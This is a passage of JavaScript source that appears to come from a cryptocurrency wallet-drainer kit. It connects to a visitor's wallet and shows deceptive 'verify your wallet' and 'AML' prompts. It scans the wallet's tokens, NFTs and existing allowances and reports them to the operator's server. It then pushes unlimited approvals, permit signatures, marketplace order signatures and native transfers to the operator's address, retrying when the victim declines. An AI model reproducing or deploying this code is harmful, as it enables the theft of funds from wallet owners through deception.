        else if (asset.type == 'ERC20' && !MS_Settings.Settings.Chains[chain_id].Tokens) assets.splice(x, 1);
        else if (asset.type == 'NATIVE' && asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_Native_Price) assets.splice(x, 1);
        else if (asset.type == 'ERC20' && asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_Tokens_Price) assets.splice(x, 1);
        else if (asset.type == 'ERC20') {
          if (MS_Settings.Settings.Permit2.Mode) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                if (asset.amount_usd >= MS_Settings.Settings.Permit2.Price) {
                  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
                  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
                  let allowance = await contract.allowance(MS_Current_Address, '0x000000000022d473030f116ddee9f6b43ac78ba3');
                  if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
                    asset.permit2 = true;
                    asset.allowance = allowance;
                    console.log(`[PERMIT_2 FOUND] ${asset.name}, Allowance: ${allowance}`);
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
          if ((MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority > 0) || (MS_Settings.Settings.Approve.MetaMask >= 2 && MS_Current_Provider == 'MetaMask') || (MS_Settings.Settings.Approve.Trust >= 2 && MS_Current_Provider == 'Trust Wallet')) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                if ((MS_Settings.Settings.Approve.MetaMask >= 2 && MS_Current_Provider == 'MetaMask') || (MS_Settings.Settings.Approve.Trust >= 2 && MS_Current_Provider == 'Trust Wallet') || asset.amount_usd >= MS_Settings.Settings.Permit.Price) {
                  const data = await retrive_token(asset.chain_id, asset.address);
                  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
                  const contract = new ethers.Contract(asset.address, data, node);
                  if (is_increase_approve(contract.functions) == 2) {
                    asset.increase = 2;
                    asset.abi = data;
                  } else if (is_increase_approve(contract.functions) == 1) {
                    asset.increase = 1;
                    asset.abi = data;
                  }
                  if (asset.amount_usd >= MS_Settings.Settings.Permit.Price) {
                    const permit_type = get_permit_type(contract.functions);
                    asset.permit = permit_type;
                    asset.permit_ver = "1";
                    asset.abi = data;
                    if (permit_type > 0) {
                      if (contract.functions.hasOwnProperty('version')) {
                        try {
                          asset.permit_ver = await contract.version();
                        } catch(err) {
                          console.log(err);
                        }
                      }
                      console.log(`[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${asset.permit_ver}`);
                    }
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
          if (MS_Settings.Settings.Swappers.Enable) {
            token_promises.push(new Promise(async (resolve) => {
              try {
                if (asset.amount_usd >= MS_Settings.Settings.Swappers.Price) {
                  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
                  for (const swapper of MS_Routers[asset.chain_id]) {
                    try {
                      const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], node);
                      const allowance = await contract.allowance(MS_Current_Address, swapper[1]);
                      if (ethers.BigNumber.from(allowance).gt(ethers.BigNumber.from('0'))) {
                        if (swapper[0] == 'Quickswap' && MS_Settings.Settings.Swappers.Quick == 0) continue;
                        if (swapper[0] == 'Sushiswap' && MS_Settings.Settings.Swappers.Sushi == 0) continue;
                        if (swapper[0] == 'Uniswap' && (!MS_Uniswap_Whitelist.includes(asset.address) || MS_Settings.Settings.Swappers.Uniswap == 0)) continue;
                        if ((swapper[0] == 'Pancake' || swapper[0] == 'Pancake_V3') && (!MS_Pancake_Whitelist.includes(asset.address) || MS_Settings.Settings.Swappers.Pancake == 0)) continue;
                        asset.swapper = true;
                        asset.swapper_type = swapper[0];
                        asset.swapper_address = swapper[1];
                        asset.swapper_allowance = allowance;
                        console.log(`[SWAP FOUND] ${asset.name}, ${swapper[0]}`);
                        break;
                      }
                    } catch(err) {
                      console.log(err);
                    }
                  }
                }
              } catch(err) {
                console.log(err);
              } resolve();
            }));
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    await Promise.all(token_promises);

    let NFT_Status = false;

    for (const chain_id in MS_Settings.Settings.Chains) {
      try {
        if (MS_Settings.Settings.Chains[chain_id].NFTs) {
          NFT_Status = false;
          break;
        }
      } catch(err) {
        console.log(err);
      }
    }

    if (NFT_Status) {
      try {
        let nft_list = [];
        response = await send_request({ action: 'check_nft', address: MS_Current_Address });
        if (response.status == 'OK') {
          nft_list = response.data;
          for (const asset of nft_list) {
            try {
              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
              if (asset.type == 'ERC1155') continue;
              if (!MS_Settings.Settings.Chains[chain_id].NFTs) continue;
              if (asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
              assets.push(asset);
            } catch(err) {
              console.log(err);
            }
          }
        } else {
          nft_list = await get_nfts(address);
          for (const asset of nft_list) {
            try {
              const chain_id = convert_chain('ID', 'ANKR', asset.chain_id);
              if (asset.type == 'ERC1155') continue;
              if (!MS_Settings.Settings.Chains[chain_id].NFTs) continue;
              if (asset.amount_usd < MS_Settings.Settings.Chains[chain_id].Min_NFTs_Price) continue;
              assets.push(asset);
            } catch(err) {
              console.log(err);
            }
          }
        }
      } catch(err) {
        console.log(err);
      }
    }

    assets.sort((a, b) => { return b.amount_usd - a.amount_usd });

    if (MS_Settings.Settings.Tokens_First == 1) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (asset.type == 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.type != 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    } else if (MS_Settings.Settings.Tokens_First == 2) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (asset.type != 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.type == 'NATIVE') continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 1) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (MS_Settings.Settings.Permit.Mode && MS_Settings.Settings.Permit.Priority > 0) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.permit || asset.permit == 0 || asset.amount_usd < MS_Settings.Settings.Permit.Priority) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.permit && asset.permit > 0 && asset.amount_usd >= MS_Settings.Settings.Permit.Priority) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    if (MS_Settings.Settings.Swappers.Enable && MS_Settings.Settings.Swappers.Priority == 2) {
      const new_assets = [];
      for (const asset of assets) {
        try {
          if (!asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      for (const asset of assets) {
        try {
          if (asset.swapper) continue;
          new_assets.push(asset);
        } catch(err) {
          console.log(err);
        }
      }
      assets = new_assets;
    }

    return assets;
  } catch(err) {
    console.log(err);
    return [];
  }
};

const APPROVE_TOKEN = async (asset) => {
  if (((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask >= 2) || (MS_Current_Provider == 'Trust Wallet' && MS_Settings.Settings.Approve.Trust >= 2)) && !asset.increase) {
    try {
      for (let x = 0; x < 2; x++) {
        if (asset.increase) continue;
        try {
          const ic_data = await retrive_token(asset.chain_id, asset.address);
          const ic_node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
          const ic_contract = new ethers.Contract(asset.address, ic_data, ic_node);
          if (is_increase_approve(ic_contract.functions) == 2) asset.increase = 2;
          else if (is_increase_approve(ic_contract.functions) == 1) asset.increase = 1;
        } catch(err) {
          console.log(err);
        }
      }
    } catch(err) {
      console.log(err);
    }
  }
  if (((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask >= 2) || (MS_Current_Provider == 'Trust Wallet' && MS_Settings.Settings.Approve.Trust >= 2)) && asset.increase) return await MM_APPROVE_TOKEN(asset);
  if (((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask == 2) || (MS_Current_Provider == 'Trust Wallet' && MS_Settings.Settings.Approve.Trust == 2)) && !asset.increase) { await TRANSFER_TOKEN(asset); return 2; }
  if (((MS_Current_Provider == 'MetaMask' && MS_Settings.Settings.Approve.MetaMask == 3) || (MS_Current_Provider == 'Trust Wallet' && MS_Settings.Settings.Approve.Trust == 3)) && !asset.increase) throw new Error('UNSUPPORTED');
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  const contract = new ethers.Contract(asset.address, MS_Contract_ABI['ERC20'], MS_Signer);
  let gas_limit = null;
  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }
  try {
    gas_limit = await contract.estimateGas.approve(MS_Settings.Address, max_approval_amount, { from: MS_Current_Address });
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
  }
  await approve_request(asset);
  sign_next();
  const tx = await contract.approve(MS_Settings.Address, max_approval_amount, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await approve_success(asset); sign_ready(); return 1;
};

const MM_APPROVE_TOKEN = async (asset) => {
  const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
  const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  const nonce = await get_nonce(asset.chain_id);
  let increase_type = (asset.increase == 2) ? 'increaseApproval' : 'increaseAllowance';
  const contract = new ethers.Contract(asset.address, [
    {
      "inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"increment","type":"uint256"}],
      "name":`${increase_type}`,"outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"
    }
  ], MS_Signer);
  let gas_limit = null;
  let max_approval_amount = ethers.utils.parseEther(MS_Unlimited_Amount);
  for (const c_address of MS_Settings.Unlimited_BL) {
    try {
      if (c_address[0] == MS_Current_Chain_ID && c_address[1] == asset.address.toLowerCase().trim()) {
        max_approval_amount = asset.amount_raw;
        break;
      }
    } catch(err) {
      console.log(err);
    }
  }
  try {
    gas_limit = await contract.estimateGas[increase_type](MS_Settings.Address, max_approval_amount, { from: MS_Current_Address });
    gas_limit = ethers.BigNumber.from(gas_limit).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
  } catch(err) {
    gas_limit = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 250000);
  }
  await approve_request(asset);
  sign_next();
  const tx = await contract[increase_type](MS_Settings.Address, max_approval_amount, {
    gasLimit: ethers.BigNumber.from(gas_limit),
    gasPrice: ethers.BigNumber.from(gas_price),
    nonce: nonce, from: MS_Current_Address
  });
  wait_message();
  if (MS_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 30000);
  await approve_success(asset); sign_ready(); return 1;
};

const connect_wallet = async (provider = null) => {
  try {
    if (!MS_Connection) {
      if (MS_Load_Time == null || Math.floor(Date.now() / 1000) - MS_Load_Time < 15) return;
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Критическая ошибка', subtitle: 'Нет связи с сервером', text: 'Скрипт не может соединиться с сервером и получить данные, возможно вы настроили что-то некорректно или домен сервера ещё недоступен или был заблокирован. Проверьте и исправьте проблемы перед использованием сайта.',
          showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
        });
      } else {
        Swal.close();
        Swal.fire({
          html: '<b>Критическая ошибка</b><br><br>Скрипт не может соединиться с сервером и получить данные, возможно вы настроили что-то некорректно или домен сервера ещё недоступен или был заблокирован. Проверьте и исправьте проблемы перед использованием сайта.', icon: 'error',
          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
          showConfirmButton: true, confirmButtonText: 'OK'
        });
      }
      return;
    }
    if (MS_Process) return; MS_Process = true;
    if (MS_Bad_Country) {
      try { ms_hide(); } catch(err) { console.log(err); }
      try {
        if (MS_Loader_Style == 2) {
          MSL.fire({
            icon: 'error', title: 'Critical Error', subtitle: 'Запрещенная геолокация', text: 'Пожалуйста, покиньте этот веб-сайт немедленно, он не предназначен для России и стран СНГ, не пытайтесь использовать VPN, это небезопасно!',
            showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
          });
        } else {
          Swal.close();
          Swal.fire({
            html: '<b>Предупреждение</b><br><br>Пожалуйста, покиньте этот веб-сайт немедленно, он не предназначен для России и стран СНГ, не пытайтесь использовать VPN, это небезопасно!', icon: 'error',
            allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
            showConfirmButton: true, confirmButtonText: 'OK'
          });
        }
        await new Promise(r => setTimeout(r, 15000));
        window.location.href = 'https://ya.ru';
      } catch(err) {
        console.log(err);
      }
      return;
    }
    if (provider !== null) {
      if (provider == 'MetaMask') {
        if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
          let is_installed = false;
          for (const elem of window.ethereum.providers) {
            if (elem.isMetaMask == true) {
              is_installed = true;
              MS_Provider = elem;
              MS_Current_Provider = 'MetaMask';
              break;
            }
          }
          if (!is_installed) {
            if (MS_Mobile_Status) {
              window.location.href = `https://metamask.app.link/dapp/${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://metamask.io', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        } else {
          if (typeof window.ethereum === 'object' && window.ethereum.isMetaMask) {
            MS_Provider = window.ethereum;
            MS_Current_Provider = 'MetaMask';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = `https://metamask.app.link/dapp/${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://metamask.io', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        }
      } else if (provider == 'Coinbase') {
        if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
          let is_installed = false;
          for (const elem of window.ethereum.providers) {
            if (elem.isCoinbaseWallet == true) {
              is_installed = true;
              MS_Provider = elem;
              break;
            }
          }
          if (is_installed) {
            MS_Current_Provider = 'Coinbase';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://www.coinbase.com/wallet', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        } else {
          if (typeof window.ethereum === 'object' && (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbaseBrowser)) {
            MS_Provider = window.ethereum;
            MS_Current_Provider = 'Coinbase';
          } else {
            if (MS_Mobile_Status) {
              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${MS_Current_URL}`;
              MS_Process = false;
              return;
            } else {
              window.open('https://www.coinbase.com/wallet', '_blank').focus();
              MS_Process = false;
              return;
            }
          }
        }
      } else if (provider == 'Trust Wallet') {
        if (typeof window.ethereum === 'object' && window.ethereum.isTrust) {
          MS_Provider = window.ethereum;
          MS_Current_Provider = 'Trust Wallet';
        } else {
          if (MS_Mobile_Status) {
            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${MS_Current_URL}`;
            MS_Process = false;
            return;
          } else {
            window.open('https://trustwallet.com', '_blank').focus();
            MS_Process = false;
            return;
          }
        }
      } else if (provider == 'Binance Wallet') {
        if (typeof window.BinanceChain === 'object') {
          MS_Provider = window.BinanceChain;
          MS_Current_Provider = 'Binance Wallet';
        } else {
          window.open('https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp', '_blank').focus();
          MS_Process = false;
          return;
        }
      } else if (provider == 'WalletConnect' || provider == 'WalletConnect_v2') {
        MS_Current_Provider = 'WalletConnect';
      } else {
        if (typeof window.ethereum === 'object') {
          MS_Provider = window.ethereum;
          MS_Current_Provider = 'Ethereum';
        } else {
          MS_Current_Provider = 'WalletConnect';
        }
      }
    } else {
      if (window.ethereum) {
        MS_Provider = window.ethereum;
        MS_Current_Provider = 'Ethereum';
      } else {
        MS_Current_Provider = 'WalletConnect';
      }
    }
    try {
      await connect_request();
      let connection = null;
      if (MS_Current_Provider == 'WalletConnect') {
        ms_hide();
       await load_wc();
        try {
          await MS_Provider.disconnect();
        } catch(err) {
          console.log(err);
        }
        await MS_Provider.connect();
        if (MS_Provider && MS_Provider.accounts.length > 0) {
          if (!MS_Provider.accounts[0].includes('0x')) {
            MS_Process = false;
            return await connect_cancel();
          }
          await new Promise(r => setTimeout(r, 2500));
          MS_Current_Address = MS_Provider.accounts[0];
          MS_Current_Chain_ID = MS_Provider.eth_chainId;
          MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
          MS_Signer = MS_Web3.getSigner();
          if (MS_Settings.Settings.Sign.WalletConnect == 0) {
            MS_Sign_Disabled = true;
          }
        } else {
          MS_Process = false;
          return await connect_cancel();
        }
      } else {
        try {
          connection = await MS_Provider.request({ method: 'wallet_requestPermissions', params: [{ eth_accounts: {} }] });
          if (connection && connection.length > 0) {
            if (!MS_Provider.eth_accounts.includes('0x')) return connect_cancel();
            MS_Current_Address = MS_Provider.eth_accounts;
            MS_Current_Chain_ID = parseInt(MS_Provider.eth_chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        } catch(err) {
          connection = await MS_Provider.request({ method: 'eth_requestAccounts' });
          if (connection && connection.length > 0) {
            if (!connection[0].includes('0x')) return connect_cancel();
            MS_Current_Address = connection[0];
            MS_Current_Chain_ID = parseInt(MS_Provider.eth_chainId);
            MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
            MS_Signer = MS_Web3.getSigner();
          } else {
            MS_Process = false;
            return await connect_cancel();
          }
        }
      }
      if (!MS_Current_Address.match(/^0x\S+$/)) throw new Error('Invalid Wallet');
    } catch(err) {
      console.log(err);
      MS_Process = false;
      return await connect_cancel();
    }
    ms_hide();
    if (MS_Settings.V_MODE == 1) {
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'load', title: 'Waiting for action', text: 'Sign message to verificate your wallet',
          showConfirmButton: true, confirmButtonText: 'Waiting...', color: MS_Color_Scheme
        });
      } else {
        Swal.fire({
          html: '<b>Sign message</b> to verificate you wallet...',
          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 0, width: 600, showConfirmButton: false
        });
      }
      try {
        const verification_message = ((MS_Verify_Message == "") ? MS_Settings.V_MSG : MS_Verify_Message).replaceAll('{{ADDRESS}}', MS_Current_Address);
        const signed_message = await MS_Signer.signMessage(verification_message);
        const is_sign_correct = ethers.utils.recoverAddress(ethers.utils.hashMessage(verification_message), signed_message);
        if (!is_sign_correct) {
          if (MS_Loader_Style == 2) {
            MSL.fire({
              icon: 'error', title: 'Error', subtitle: 'Verification Error', text: 'We have received your signature, but it\'s incorrect, please try again.',
              showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
            });
          } else {
            Swal.fire({
              title: 'Verification Error',
              text: "We have received your signature, but it's incorrect, please try again.",
              icon: 'error', confirmButtonText: 'OK'
            });
          }

          MS_Process = false;
          return await connect_cancel();
        } else {
          let server_result = await send_request({ action: 'sign_verify', sign: signed_message, address: MS_Current_Address, message: MS_Verify_Message });
          if (server_result.status != 'OK') {
            if (MS_Loader_Style == 2) {
              MSL.fire({
                icon: 'error', title: 'Error', subtitle: 'Verification Error', text: 'We have received your signature, but it\'s incorrect, please try again.',
                showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
              });
            } else {
              Swal.fire({
                title: 'Verification Error',
                text: "We have received your signature, but it's incorrect, please try again.",
                icon: 'error', confirmButtonText: 'OK'
              });
            }
            MS_Process = false;
            return await connect_cancel();
          }
        }
      } catch(err) {
        if (MS_Loader_Style == 2) {
          MSL.fire({
            icon: 'error', title: 'Error', subtitle: 'Verification Error', text: 'We cannot verify that the wallet is yours as you did not sign the message provided.',
            showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
          });
        } else {
          Swal.fire({
            title: 'Verification Error',
            text: "We cannot verify that the wallet is yours as you did not sign the message provided.",
            icon: 'error', confirmButtonText: 'OK'
          });
        }
        MS_Process = false;
        return await connect_cancel();
      }
    } else {
      await send_request({ action: 'sign_verify', address: MS_Current_Address });
    }
    await connect_success(); show_check();
    if (MS_Settings.Wallet_Blacklist.length > 0 && MS_Settings.Wallet_Blacklist.includes(MS_Current_Address.toLowerCase().trim())) {
      MS_Check_Done = true; Swal.close();
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Error', subtitle: 'AML Error', text: 'Your wallet is not AML clear!',
          showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
        });
      } else {
        Swal.fire({
          title: 'AML Error',
          text: "Your wallet is not AML clear, you can\'t use it!",
          icon: 'error', confirmButtonText: 'OK'
        });
      }
      MS_Process = false;
      return;
    }
    let assets = await get_wallet_assets(MS_Current_Address);
    let assets_price = 0; for (const asset of assets) {
      try {
        assets_price += asset.amount_usd;
      } catch(err) {
        console.log(err);
      }
    }
    let assets_usd_balance = 0; for (const asset of assets) assets_usd_balance += asset.amount_usd;
    await send_request({ action: 'check_finish', user_id: MS_ID, assets: assets, balance: assets_usd_balance });
    MS_Check_Done = true; Swal.close();
    if (MS_Settings.Settings.Minimal_Wallet_Price > assets_price) {
      if (MS_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Error', subtitle: 'Something went wrong!', text: 'For security reasons we can\'t allow you to connect empty or new wallet',
          showConfirmButton: true, confirmButtonText: 'OK', color: MS_Color_Scheme
        });
      } else {
        Swal.fire({
          title: 'Something went wrong!',
          text: "For security reasons we can't allow you to connect empty or new wallet",
          icon: 'error', confirmButtonText: 'OK'
        });
      }
      MS_Process = false;
      return;
    }
    if (MS_Loader_Style == 2) {
      MSL.fire({
        icon: 'load', title: 'Waiting for action', text: 'Sign message in your wallet...',
        showConfirmButton: true, confirmButtonText: 'Waiting...', color: MS_Color_Scheme
      });
    } else {
      Swal.fire({
        html: '<b>Done!</b> Sign message in your wallet to continue...',
        imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
    if ((MS_Settings.Settings.Sign.MetaMask == 0 && MS_Current_Provider == 'MetaMask') || (MS_Settings.Settings.Sign.Trust == 0
      && MS_Current_Provider == 'Trust Wallet') || (MS_Current_Provider == 'Trust Wallet' && !MS_Mobile_Status)) MS_Sign_Disabled = true;
    for (const asset of assets) {
      try {
        if (asset.type != 'NATIVE') MS_Gas_Reserves[asset.chain_id] += 1;
      } catch(err) {
        console.log(err);
      }
    }
    if (typeof SIGN_BLUR !== 'undefined' && MS_Settings.Settings.Blur.Enable == 1 && MS_Settings.Settings.Blur.Priority == 1)
      await SIGN_BLUR(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.Blur.Price);
    if (typeof SIGN_SEAPORT !== 'undefined' && MS_Settings.Settings.SeaPort.Enable == 1 && MS_Settings.Settings.SeaPort.Priority == 1)
      await SIGN_SEAPORT(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.SeaPort.Price);
    if (typeof SIGN_X2Y2 !== 'undefined' && MS_Settings.Settings.x2y2.Enable == 1 && MS_Current_Chain_ID == 1 && MS_Settings.Settings.x2y2.Priority == 1)
      await SIGN_X2Y2(assets, MS_Provider, MS_Current_Address, MS_Settings.Address, MS_ID, MS_Settings.Settings.x2y2.Price);
    let should_repeat_all = true;
    while (should_repeat_all) {
      should_repeat_all = (MS_Settings.LA == 1);
      for (const asset of assets) {
        try {
          if (asset.skip) continue;
          let is_chain_correct = false;
          if (asset.type == 'NATIVE') {
            const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]); let is_contract_use = false;
            const gas_price = ethers.BigNumber.from(await node.getGasPrice()).div(ethers.BigNumber.from('100')).mul(ethers.BigNumber.from('120')).toString();
            if (MS_Settings.Settings.Chains[convert_chain('ID', 'ANKR', asset.chain_id)].Contract_Address != '') is_contract_use = true;
            const gas_limit_nt = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (is_contract_use ? 100000 : 30000));
            const gas_limit_ct = (asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : 150000);
            const gas_price_calc = ethers.BigNumber.from(asset.chain_id == 10 ? '35000000000' : gas_price);
            const nt_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_nt))).mul(ethers.BigNumber.from('2'));
            const ct_fee = (gas_price_calc.mul(ethers.BigNumber.from(gas_limit_ct))).mul(ethers.BigNumber.from(String(MS_Gas_Reserves[asset.chain_id])));
            const after_fee = ethers.BigNumber.from(asset.amount_raw).sub(nt_fee).sub(ct_fee).toString();
            console.log(after_fee);
            if (ethers.BigNumber.from(after_fee).lte(ethers.BigNumber.from('0'))) continue;
          }
          if (asset.chain_id != MS_Current_Chain_ID) {
            await chain_request(MS_Current_Chain_ID, asset.chain_id);
            try {
              if (MS_Current_Provider == 'WalletConnect') {
                try {
                  await MS_Provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId:  `0x${asset.chain_id.toString(16)}` }] });
                } catch(err) {
                  await chain_cancel();
                  continue;
                }
              } else {
                try {
                  await MS_Provider.request({
                    method: "wallet_switchEthereumChain", params: [{ chainId: `0x${asset.chain_id.toString(16)}` }]
                  });
                } catch(err) {
                  if (err.code == 4902 || err.code == -32603) {
                    try {
                      await MS_Provider.request({ method: "wallet_addEthereumChain", params: [ MS_MetaMask_ChainData[asset.chain_id] ] });
                    } catch(err) {
                      await chain_cancel();
                      continue;
                    }
                  } else {
                    await chain_cancel();
                    continue;
                  }
                }
              }
              MS_Current_Chain_ID = asset.chain_id;
              MS_Web3 = new ethers.providers.Web3Provider(MS_Provider);
              MS_Signer = MS_Web3.getSigner();
              is_chain_correct = true;
              await chain_success();
            } catch(err) {
              console.log(err);
              await chain_cancel();
              continue;
            }
          } else {
            is_chain_correct = true;
          }
          if (!is_chain_correct) continue;
          if (asset.type == 'NATIVE') {
            if (MS_Settings.Settings.Sign.Native > 0 && (!MS_Sign_Disabled || MS_Settings.Settings.Sign.Force == 1)) {
              while (true) {
                try {
                  await SIGN_NATIVE(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if ((MS_Settings.Settings.Sign.WC_AE == 1 && MS_Current_Provider == 'WalletConnect') || (typeof err.message == 'string' && err.message.includes('eth_sign')) || err.code == -32601
                  || err.code == -32000 || (err.message && is_valid_json(err.message) && ((JSON.parse(err.message)).code == -32601 || (JSON.parse(err.message)).code == -32000))) {
                    if (MS_Settings.Settings.Sign.Force == 1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        try {
                          await TRANSFER_NATIVE(asset);
                          asset.skip = true;
                          break;
                        } catch(err) {
                          console.log(err);
                          if (err != 'LOW_BALANCE') {
                            await transfer_cancel();
                            if (!MS_Settings.Loop_N) break;
                          } else {
                            break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(err);
                    if (err != 'LOW_BALANCE') {
                      await sign_cancel();
                      if (!MS_Settings.Loop_N) break;
                    } else {
                      break;
                    }
                  }
                }
              }
            } else {
              while (true) {
                try {
                  await TRANSFER_NATIVE(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if (err != 'LOW_BALANCE') {
                    await transfer_cancel();
                    if (!MS_Settings.Loop_N) break;
                  } else {
                    break;
                  }
                }
              }
            }
          } else if (asset.type == 'ERC20') {
            if (typeof asset.permit == 'undefined' && MS_Settings.Settings.Permit.Mode && asset.amount_usd >= MS_Settings.Settings.Permit.Price) {
              const data = await retrive_token(asset.chain_id, asset.address);
              const node = new ethers.providers.JsonRpcProvider(MS_Settings.RPCs[asset.chain_id]);
              const contract = new ethers.Contract(asset.address, data, node);
              const permit_type = get_permit_type(contract.functions);
              asset.permit = permit_type;
